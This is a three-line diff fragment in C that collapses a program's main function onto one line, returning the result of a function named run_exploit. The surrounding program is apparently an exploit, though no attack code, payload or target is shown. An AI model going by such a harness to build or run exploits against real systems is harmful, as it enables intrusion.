-    return run_exploit(argc, argv);
-}
+int main(int argc, char **argv) { return run_exploit(argc, argv); }
